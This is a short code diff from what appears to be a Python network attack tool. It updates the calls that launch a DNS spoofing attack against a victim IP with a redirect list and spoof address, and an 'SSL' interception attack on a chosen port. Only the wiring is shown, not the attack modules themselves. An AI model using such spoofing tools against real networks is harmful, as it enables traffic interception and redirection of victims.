@@ -85,14 +85,15 @@ def main():
                 urlList.update({url[4:]+"": redirectTo})
             url = url.lower()
 
-        dnsAttack = dnsSpoofing.Dns(networkInterface, victimIP[0], urlList)
+        dnsAttack = dnsSpoofing.Dns(networkInterface, victimIP[0], spoofIP, urlList)
         dnsAttack.start()
 
 
 
     if typeOfAttack == "ssl":
         port = raw_input("Enter port (e.g. 8050): ")
-        sslAttack = httpResponse.SSL()
+        sslAttack = httpResponse.Ssl(victimIP[0], port, networkInterface)
+        sslAttack.start()
 
 
 
